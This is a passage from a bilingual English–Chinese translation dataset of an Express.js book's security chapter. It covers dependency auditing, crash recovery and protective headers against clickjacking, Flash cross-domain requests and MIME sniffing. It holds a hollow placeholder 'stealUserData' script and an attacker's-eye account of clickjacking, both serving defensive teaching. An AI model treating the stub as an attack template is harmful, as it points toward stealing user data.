  zh: 任何Express应用程序都将至少依赖于一个第三方模块：Express。如果这本书的其余部分已经向你展示了什么，那就是你将依赖于很多第三方模块。这有一个巨大的优势，那就是你不必编写很多样板代码，但它也带来一个成本：你正在将这些模块的信任放在上面。如果模块创建了一个安全问题怎么办？
- en: 'There are three big ways that you can keep your dependencies safe:'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以保持依赖项安全的三种主要方式：
- en: 1.  Audit the code yourself
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 1.  自己审核代码
- en: 2.  Make sure you're on the latest versions
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 2.  确保你使用的是最新版本
- en: 3.  Check against the Node Security Project
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 3.  与Node安全项目进行核对
- en: 10.4.1   Auditing the code
  id: totrans-200
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.4.1   审核代码
- en: It might sound a bit crazy, but you can often easily audit the code of your
    dependencies. While some modules like Express have a relatively large surface
    area, many of the modules you'll install are only a small number of lines, and
    you can understand them quickly. It's a fantastic way to learn, too!
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 这可能听起来有点疯狂，但你通常可以很容易地审核你依赖项的代码。虽然一些模块，如Express，拥有相对较大的表面区域，但你将要安装的许多模块只是一小部分代码，你可以快速理解它们。这也是一种极好的学习方法！
- en: Just as you might look through your own code for bugs or errors, you can look
    through other people's code for bugs and errors. If you spot them, you can avoid
    the module. If you're feeling generous, you can often submit patches because these
    packages are all open source.
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 就像你可能检查自己的代码以查找bug或错误一样，你也可以检查他人的代码以查找bug和错误。如果你发现了它们，你可以避免使用该模块。如果你愿意，你通常可以提交补丁，因为这些包都是开源的。
- en: If you've already installed the module, you can find its source code in your `node_modules` directory.
    You can almost always find modules on GitHub with a simple search, or from a link
    on the npm registry.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你已经安装了该模块，你可以在`node_modules`目录中找到它的源代码。你几乎总是可以通过简单的搜索在GitHub上找到模块，或者从npm注册表上的链接找到。
- en: It's also worth checking a project's overall status. If a module is old but
    works reliably and has no open bugs, then it's probably safe. But if it has lots
    of bug reports and hasn't been updated in a long time, that's not a good sign!
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 值得注意的是，检查项目整体状态也很重要。如果一个模块虽然老旧但工作可靠且没有公开的bug，那么它可能很安全。但如果它有很多bug报告并且长时间没有更新，那么这可不是什么好兆头！
- en: 10.4.2   Keeping your dependencies up to date
  id: totrans-205
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.4.2   保持你的依赖项更新
- en: It's (almost) always a good idea to have the latest versions of things. People
    tune performance, fix bugs, and improve APIs. You could manually go through each
    of your dependencies to find out which versions were out of date, or you could
    use a tool built into npm: `npm outdated`.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 通常来说，保持事物的最新版本是一个好主意。人们调整性能、修复bug和改进API。你可以手动检查每个依赖项以找出哪些版本已经过时，或者你可以使用npm内置的工具：`npm
    outdated`。
- en: 'Let''s say that your project has Express 4.2.0 installed, but the latest version
    is 4.11.1 (which I''m sure will be out of date by the time you read this). In
    your project directory, run `npm outdated --depth 0` and you''ll see an output
    something like this:'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 假设你的项目已安装 Express 4.2.0，但最新版本是 4.11.1（我确信到你阅读这篇文章时它已经过时了）。在你的项目目录中运行`npm outdated
    --depth 0`，你将看到类似以下的内容：
- en: '`Package       Current  Wanted  Latest  Location` `express         4.2.0  
    4.2.0  4.11.1  express`'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: '`包       当前  希望的  最新  位置` `express         4.2.0   4.2.0  4.11.1  express`'
- en: If you have other outdated packages, this command will report those too. Go
    into your `package.json`, update the versions, and run npm install to get the
    latest versions!  It's a good idea to check for outdated packages frequently.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你还有其他过时的包，此命令也会报告这些。进入你的`package.json`，更新版本，然后运行npm install以获取最新版本！经常检查过时的包是个好主意。
- en: What's that depth thing?
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 那个深度是什么意思？
- en: '`npm outdated --depth 0` will tell you all of the modules that are outdated
    that you installed. `npm outdated` without the depth flag tells you modules that
    are outdated, even ones you didn''t directly install. For example, Express depends
    on a module called`cookie`. If `cookie` gets updated but Express doesn''t update
    to the latest version of `cookie`, then you''ll get a warning about `cookie`,
    even though it isn''t really your "fault".'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: '`npm outdated --depth 0` 将告诉你所有已安装的过时模块。没有`depth`标志的`npm outdated`会告诉你过时的模块，即使这些模块不是你直接安装的。例如，Express
    依赖于一个名为`cookie`的模块。如果`cookie`被更新，但 Express 没有更新到`cookie`的最新版本，那么你将收到关于`cookie`的警告，即使这并不是你的“过错”。'
- en: There's not much I can do if Express doesn't update to the latest version (that's
    largely out of my control), other than update to the latest version of Express
    (which is in my control). The `--depth` flag only shows actionable information,
    where leaving it out gives you a bunch of information you can't really use.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 Express 不更新到最新版本（这很大程度上超出了我的控制范围），我除了更新到 Express 的最新版本（这在我控制范围内）之外，别无他法。`--depth`标志只显示可操作的信息，省略它将给你一大堆实际上无法使用的信息。
- en: 'Another side note: you''ll want to make sure that you''re on the latest version
    of Node, too. Check nodejs.org and make sure you''re on the latest version.'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 另一方面：你还需要确保自己使用的是最新版本的 Node。检查 nodejs.org 并确保你使用的是最新版本。
- en: 10.4.3   Check against the Node Security Project
  id: totrans-214
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.4.3   对照节点安全项目进行检查
- en: Sometimes, modules have security issues. Some nice folks set up the Node Security
    Project, an ambitious undertaking to audit every module in the npm registry. If
    they find an insecure module, they post an advisory at http://nodesecurity.io/advisories.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 有时，模块存在安全问题。一些好心的朋友建立了节点安全项目，这是一个雄心勃勃的举措，旨在审计 npm 注册表中的每个模块。如果他们发现不安全的模块，他们将在http://nodesecurity.io/advisories上发布安全建议。
- en: The Node Security Project also comes with a command-line tool, called `nsp`.
    It's a simple but powerful tool that scans your `package.json` for insecure dependencies
    (by comparing them against their database).
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 节点安全项目还附带一个名为`nsp`的命令行工具。这是一个简单但功能强大的工具，它会扫描你的`package.json`以查找不安全的依赖项（通过将其与数据库进行比较）。
- en: 'To install it, run `npm install –g nsp` to install the module globally. Now,
    in the same directory as your `package.json`, type:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 要安装它，运行`npm install –g nsp`以全局安装模块。现在，在`package.json`所在的同一目录下，输入：
- en: '`nsp audit-package`'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: '`nsp audit-package`'
- en: Most of the time, you'll get a nice message that tells you that your packages
    are known to be secure. But sometimes, one of your dependencies (or, more often,
    one of your dependencies' dependencies) has a security hole.
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数时候，你会收到一条友好的消息，告诉你你的包已知是安全的。但有时，你的某个依赖项（或者更常见的是，你的依赖项的依赖项）存在安全漏洞。
- en: 'For example, Express depends on a module called `serve-static`; this is `express.static`,
    the static file middleware. In early 2015, a vulnerability was found in `serve-static`. 
    If you''re using a version of Express that depended on`serve-static`, run `nsp
    audit-package` and you''ll see something like this:'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，Express 依赖于一个名为`serve-static`的模块；这是`express.static`，静态文件中间件。在2015年初，`serve-static`被发现存在漏洞。如果你使用的是依赖于`serve-static`的
    Express 版本，运行`nsp audit-package`，你将看到类似以下的内容：
- en: '`` `Name`           `Installed`  `Patched`  `Vulnerable Dependency` `` `serve-static      
    1.7.1  >=1.7.2  myproject > express`'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: '`` `名称`           `已安装`  `已修复`  `有漏洞的依赖` `` `serve-static       1.7.1  >=1.7.2 
    myproject > express`'
- en: 'There are basically two important things here. The leftmost column tells you
    the name of the problematic dependency. The rightmost column shows you the chain
    of dependencies that lead to the problem. In this example, your project (called
    "myproject") is the first issue, which depends on Express, which then depends
    on `serve-static`. This means that Express needs to update in order to get the
    latest version of `serve-static`.  If you depended on serve-static directly, you''d
    only see your project name in the list, like this:'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 这里基本上有两件重要的事情。最左边的列告诉你有问题的依赖项的名称。最右边的列显示了导致问题的依赖项链。在这个例子中，你的项目（称为"myproject"）是第一个问题，它依赖于Express，然后依赖于`serve-static`。这意味着Express需要更新才能获取`serve-static`的最新版本。如果你直接依赖于`serve-static`，你只会看到项目名称在列表中，如下所示：
- en: '`` `Name`           `Installed`  `Patched`  `Vulnerable Dependency` `` `serve-static      
    1.7.1  >=1.7.2  myproject`'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: '`` `名称`           `已安装`  `已修复`  `有漏洞的依赖项` `` `serve-static       1.7.1  >=1.7.2 
    myproject`'
- en: Note that modules can still be insecure; there are so many modules on npm that
    the Node Security Project can't possibly audit all of them. But it's another helpful
    tool to help keep your apps secure.
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，模块仍然可能是不安全的；npm上有如此多的模块，Node Security Project不可能审计它们全部。但它又是另一个有助于保持应用程序安全的工具。
- en: 10.5  Handling server crashes
  id: totrans-225
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 10.5 处理服务器崩溃
- en: 'I''ve got some bad news: your server is might crash at some point.'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 我有一个坏消息：你的服务器可能在某个时候崩溃。
- en: There are loads of things that can crash your servers. Perhaps there's a bug
    in your code and you're referencing an undefined variable; perhaps a hacker has
    found a way to crash your server with malicious input; perhaps your servers have
    reached their capacities. Unfortunately, these apps can get wildly complicated,
    and at some point, they might crash.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 有很多事情可能导致你的服务器崩溃。也许你的代码中有一个错误，你引用了一个未定义的变量；也许黑客找到了一种方法，可以通过恶意输入使你的服务器崩溃；也许你的服务器已经达到其容量。不幸的是，这些应用程序可能会变得非常复杂，并且可能在某个时候崩溃。
- en: And while this chapter has tips to help keep your apps running smoothly, you
    don't want a crash to completely ruin your day. While they're not ideal, you can
    recover from them.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然本章有一些帮助应用程序平稳运行的技巧，但你不想让崩溃完全毁了你的一天。虽然它们不是理想的，但你还是可以从它们中恢复过来。
- en: 'The folks at Nodejitsu developed a simple tool called Forever. Its name might
    be a hint: it keeps your apps running forever. The important part: if your app
    crashes, Forever will try to restart it.'
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: Nodejitsu团队开发了一个名为Forever的简单工具。它的名字可能是一个提示：它可以让你的应用程序永远运行。重要的是：如果你的应用程序崩溃，Forever会尝试重新启动它。
- en: 'To install Forever, just run `npm install forever --save`. You''ve probably
    had an `npm start` script in your `package.json` for awhile, and we''re going
    to change it from this:'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 要安装Forever，只需运行`npm install forever --save`。你可能已经在`package.json`中有一个`npm start`脚本一段时间了，我们将将其从以下内容更改：
- en: Listing 10.16 A classic npm start script
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.16 经典的npm start脚本
- en: '`…` `"scripts": {` `  "start": "node app.js"` `}``…`'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: '`…` `"scripts": {` `  "start": "node app.js"` `}``…`'
- en: '…to this:'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: …到这个：
- en: Listing 10.17 npm start with Forever
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.17 使用Forever的npm start
- en: '`…` `"scripts": {` `  "start": "forever app.js"` `}``…`'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: '`…` `"scripts": {` `  "start": "forever app.js"` `}``…`'
- en: And now your server will restart if it crashes!
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 现在如果你的服务器崩溃，它将会重新启动！
- en: NOTE You can see a simple code example of this in action at the book's source
    code repository at [https://github.com/EvanHahn/Express.js-in-Action-code/tree/master](https://github.com/EvanHahn/Express.js-in-Action-code/tree/master) /Chapter_09/forever-example.
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 注意：你可以在本书的源代码仓库中看到这个简单代码示例的实际应用，网址为[https://github.com/EvanHahn/Express.js-in-Action-code/tree/master](https://github.com/EvanHahn/Express.js-in-Action-code/tree/master)
    /Chapter_09/forever-example。
- en: 10.6  Various little tricks
  id: totrans-238
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 10.6 各种小技巧
- en: We’ve already covered most of the big topics like cross-site scripting and HTTPS.
    There are a few other tricks that you can employ to make your Express applications
    even more secure. The topics in this section are hardly as essential in the ones
    above, but they’re quick and easy and can lower the amount of places that you
    can be attacked.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经涵盖了大多数重要主题，如跨站脚本和HTTPS。还有一些其他技巧可以帮助你使你的Express应用程序更加安全。本节中的主题并不像上面那些主题那样必要，但它们简单易行，可以减少你被攻击的地方。
- en: 10.6.1   No Express here!
  id: totrans-240
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.6.1 没有Express在这里！
- en: If a hacker wants to break into your site, they've got a lot of things to try.
    If they know that your site is powered by Express and they know that Express or
    Node have some kind of security flaw, they can try to exploit it. It'd be better
    to leave hackers in the dark about this!
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 如果黑客想要入侵你的网站，他们有很多事情要尝试。如果他们知道你的网站是由Express驱动的，并且知道Express或Node存在某种安全漏洞，他们可以尝试利用它。最好让黑客对此一无所知！
- en: 'By default, however, Express publicizes itself. In every request, there''s
    an HTTP header that identifies your site as powered by Express. `X-Powered-By:
    Express` is sent with every request, by default. This can easily be disabled with
    a setting:'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: '然而，默认情况下，Express会公开自己。在每次请求中，都有一个标识你的网站由Express驱动的HTTP头部。默认情况下，`X-Powered-By:
    Express`会随每个请求发送。这可以通过一个设置轻松禁用：'
- en: 'Listing 10.18 Disabling X-Powered-By: Express'
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: '列表10.18 禁用X-Powered-By: Express'
- en: '`app.disable("x-powered-by");  #A`'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.disable("x-powered-by");  #A`'
- en: '#A Disabling the x-powered-by option disables the setting of the header.'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 禁用x-powered-by选项会禁用头部的设置。'
- en: Disabling this will make it just a little harder for hackers. It'll hardly make
    you invincible—there are plenty of other avenues for attack—but it can help a
    little!
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 禁用这个选项会让黑客的工作稍微困难一些。这几乎不能让你变得无敌——攻击的途径还有很多——但它确实能起到一点帮助！
- en: 10.6.2   Preventing clickjacking
  id: totrans-247
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.6.2 防止点击劫持
- en: I think clickjacking is quite clever. It's relatively easy to prevent, but I
    almost feel guilty for doing so—it's such a clever trick.
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 我认为点击劫持相当巧妙。相对容易预防，但我几乎觉得这样做有些内疚——这是一个如此巧妙的技巧。
- en: 'Imagine I''m a hacker, and I want to find out information from your private
    social networking profile. I''d love it if you would just make your profile public.
    It''d be so easy, if I could just get you to click the big button:'
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 想象一下，我是一个黑客，我想从你的私人社交网络个人资料中获取信息。如果你能直接将你的个人资料公开，我会很高兴。如果我能让你点击那个大按钮，那就太容易了：
- en: '![](../Images/10_03.png)'
  id: totrans-250
  prefs: []
  type: TYPE_IMG
  zh: '![图片10_03](../Images/10_03.png)'
- en: Figure 10.3 An example page for a social network.
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.3 社交网络的一个示例页面。
- en: 'Clickjacking takes advantage of browser frames—the ability to embed one page
    in another—to make this happen. I could send you a link to an innocent-looking
    page, which might look something like this:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 点击劫持利用了浏览器框架——将一个页面嵌入另一个页面的能力——来实现这一点。我可以给你发一个看起来无辜的页面的链接，它可能看起来像这样：
- en: '![](../Images/10_04.png)'
  id: totrans-253
  prefs: []
  type: TYPE_IMG
  zh: '![图片10_04](../Images/10_04.png)'
- en: Figure 10.4 An innocent-looking page that's concealing a clickjacking attack.
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.4 一个看似无辜但实际上隐藏着点击劫持攻击的页面。
- en: But in reality, this innocent-looking page is concealing the social network
    page! There's an `<iframe>` of the social network site, and it's invisible. It's
    positioned just right, so that when you click "Click here to enter my page", you're
    actually clicking "Click to make profile public".
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 但实际上，这个看起来无辜的页面却隐藏着社交网络页面！里面有一个来自社交网络网站的`<iframe>`，它是不可见的。它放置得恰到好处，所以当你点击“点击此处进入我的页面”时，你实际上是在点击“点击使个人资料公开”。
- en: '![](../Images/10_05.png)'
  id: totrans-256
  prefs: []
  type: TYPE_IMG
  zh: '![图片10_05](../Images/10_05.png)'
- en: Figure 10.5 Not so innocent now, is it!?
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.5 现在不再那么无辜了，对吧！？
- en: I don't know about you, but I think that's quite clever. Unfortunately for hackers,
    it's quite easily prevented.
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 我不知道你，但我觉得这相当巧妙。不幸的是，对于黑客来说，这很容易预防。
- en: Most browsers (and all modern ones) listen for a header called `X-Frame-Options`.
    If it's loading a frame or iframe and that page sends a restrictive `X-Frame-Options`,
    the browser won't load the frame any longer.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数浏览器（以及所有现代浏览器）都会监听一个名为`X-Frame-Options`的头部。如果它正在加载一个框架或iframe，并且该页面发送了一个限制性的`X-Frame-Options`，浏览器将不再加载该框架。
- en: '`X-Frame-Options` has three options. `DENY` keeps anyone from putting your
    site in a frame, period. `SAMEORIGIN` keeps anyone else from putting your site
    in a frame, but your own site is allowed. You can also let one other site through
    with the `ALLOW-FROM` option. I''d recommend the `SAMEORIGIN` or `DENY` options.'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: '`X-Frame-Options`有三个选项。`DENY`阻止任何人将你的网站放入框架中。`SAMEORIGIN`阻止其他人将你的网站放入框架中，但允许你自己的网站。你也可以使用`ALLOW-FROM`选项允许另一个网站通过。我建议使用`SAMEORIGIN`或`DENY`选项。'
- en: 'As before, if you''re using Helmet, you can set them quite easily:'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 和之前一样，如果你使用Helmet，你可以很容易地设置它们：
- en: Listing 10.19 Keeping your app out of frames
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.19 将你的应用排除在框架之外
- en: '`app.use(helmet.frameguard("sameorigin"));` `// or…``app.use(helmet.frameguard("deny"));`'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.use(helmet.frameguard("sameorigin"));` `// 或者…``app.use(helmet.frameguard("deny"));`'
- en: This Helmet middleware will set the `X-Frame-Options` so you don't have to worry
    about your pages being susceptible to clickjacking attacks.
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 这个Helmet中间件会设置`X-Frame-Options`，这样你就不必担心你的页面容易受到点击劫持攻击。
- en: 10.6.3   Keeping Adobe products out of your site
  id: totrans-265
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.6.3   将Adobe产品排除在您的网站之外
- en: Adobe products like Flash Player and Reader can make cross-origin web requests.
    As a result, a Flash file could make requests to your server. If another website
    serves a malicious Flash file, users of that site could make arbitrary requests
    to your Express application (likely unknowingly). This could cause them to hammer
    your server with requests or to load resources you don’t intend them to.
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: Adobe产品，如Flash Player和Reader，可以进行跨域网络请求。因此，一个Flash文件可能会向您的服务器发送请求。如果另一个网站提供了恶意Flash文件，该网站的访客可能会对您的Express应用程序发起任意请求（可能是不知情的）。这可能导致他们不断向您的服务器发送请求或加载您不希望他们加载的资源。
- en: 'This is easily prevented by adding a file at the root of your site called `crossdomain.xml`. 
    When an Adobe product is going to load a file off of your domain, it will first
    check the `crossdomain.xml` file to make sure your domain allows it. As the administrator,
    you can define this XML file to keep certain Flash users in or out of your site.
    It’s likely, however, that you don’t want any Flash users on your page. In that
    case, make sure you’re serving this XML content at the root of your site (at `/crossdomain.xml`):'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 通过在您的网站根目录下添加一个名为`crossdomain.xml`的文件，可以轻松防止这种情况。当Adobe产品即将从您的域加载文件时，它将首先检查`crossdomain.xml`文件，以确保您的域允许这样做。作为管理员，您可以定义此XML文件以将某些Flash用户包含或排除在您的网站之外。然而，您可能不希望任何Flash用户出现在您的页面上。在这种情况下，请确保您在网站根目录（在`/crossdomain.xml`）提供此XML内容。
- en: Listing 10.20 The most restrictive crossdomain.xml
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.20：最严格的crossdomain.xml
- en: '`<?xml version="1.0"?>` `<!DOCTYPE cross-domain-policy SYSTEM [CA]` `"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">`
    `<cross-domain-policy>` `  <site-control permitted-cross-domain-policies="none">``</cross-domain-policy>`'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: '`<?xml version="1.0"?>` `<!DOCTYPE cross-domain-policy SYSTEM [CA]` `"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">`
    `<cross-domain-policy>` `  <site-control permitted-cross-domain-policies="none">``</cross-domain-policy>`'
- en: This prevents any Flash users from loading content off of your site, unless
    they come from your domain. If you’re interested in changing this policy, take
    a look at the spec at[https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html](https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html).
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以防止任何Flash用户从您的网站上加载内容，除非他们来自您的域。如果您想更改此策略，请查看[https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html](https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html)上的规范。
- en: 'This file can be served up in a few ways. If you’re using Helmet from before,
    you can simply add a middleware and be done:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 此文件可以通过几种方式提供服务。如果您之前使用过Helmet，您可以简单地添加一个中间件并完成：
- en: Listing 10.22 Serving crossdomain.xml with Helmet
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.22：使用Helmet提供crossdomain.xml
- en: '`app.use(helmet.crossdomain());`'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.use(helmet.crossdomain());`'
- en: Alternatively, if you're serving static files (which you likely are), you can
    place that restrictive `crossdomain.xml` file into your static file directory.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，如果您正在提供静态文件（您很可能在这样做），可以将此限制性的`crossdomain.xml`文件放入您的静态文件目录中。
- en: 10.6.4   Don't let browsers infer the filetype
  id: totrans-275
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.6.4   不要让浏览器推断文件类型
- en: 'Imagine a user has uploaded a plain text file to my server called `file.txt`.
    My server serves this with a `text/plain` content-type, because it''s plain text.
    So far, this is simple. But what if `file.txt` contains something like this:'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 想象一个用户已将一个名为`file.txt`的纯文本文件上传到我的服务器。我的服务器以`text/plain`内容类型提供服务，因为它就是纯文本。到目前为止，这很简单。但如果`file.txt`包含如下内容：
- en: Listing 10.23 A malicious script that could be stored as plain text
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.23：可能以纯文本形式存储的恶意脚本
- en: '`function stealUserData() {` `  // something evil in here…` `}``stealUserData();`'
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: '`function stealUserData() {` `  // 这里有一些邪恶的东西…` `}``stealUserData();`'
- en: Even though we're serving this file as plain text, this looks like JavaScript,
    and some browsers will try to "sniff" the file type. That means that you can still
    run that file with `<script src="file.txt"></script>`. Many browsers will allow`file.txt` to
    be run even if the content-type isn't for JavaScript!
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 即使我们将此文件作为纯文本提供服务，它看起来像JavaScript，一些浏览器会尝试“嗅探”文件类型。这意味着您仍然可以使用`<script src="file.txt"></script>`来运行该文件。许多浏览器即使内容类型不是JavaScript，也会允许运行`file.txt`。
- en: This example extends further if `file.txt` looks like HTML and the browser interprets
    it as HTML. That HTML page can contain malicious JavaScript, which could do lots
    of bad things!
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 如果`file.txt`看起来像HTML，并且浏览器将其解释为HTML，那么这个HTML页面可以包含恶意JavaScript，这可能会做很多坏事！
- en: 'Luckily, we can fix this with a single HTTP header. You can set the `X-Content-Type-Options` header
    to its only option, `nosniff`. Helmet comes with `noSniff` middleware, and you
    can use it like this:'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 幸运的是，我们可以通过一个单一的 HTTP 头部来解决这个问题。你可以将 `X-Content-Type-Options` 头部设置为它的唯一选项，`nosniff`。Helmet
    包含 `noSniff` 中间件，你可以这样使用它：
- en: Listing 10.24 Preventing browsers from sniffing MIME types
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10.24 防止浏览器嗅探 MIME 类型
- en: '`app.use(helmet.noSniff());`'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.use(helmet.noSniff());`'
- en: Nice that one HTTP header can fix this!
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 真好，一个 HTTP 头部就能解决这个问题！
- en: 10.7  Summary
  id: totrans-285
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 10.7  总结
- en: 'In this chapter, we’ve learned how:'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了如何：
- en: ·  The “security mindset” can keep you more secure
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: ·  “安全思维模式”可以使你更加安全
- en: ·  To keep your Express code bug-free, using tools like JSHint, testing, and
    awareness of common of bugs
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: ·  为了确保你的 Express 代码无bug，可以使用 JSHint 工具、进行测试以及了解常见的bug
- en: ·  Various attacks; how they work, and how to prevent them. These included cross-site
    scripting, cross-site request forgery, man-in-the-middle attacks, clickjacking,
    and more.
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: ·  各种攻击方式；它们是如何工作的，以及如何预防。这包括跨站脚本攻击、跨站请求伪造、中间人攻击、点击劫持等。
- en: ·  To handle the inevitable server crash
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: ·  处理不可避免的服务器崩溃
- en: ·  Audit your third-party code
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: ·  审计第三方代码
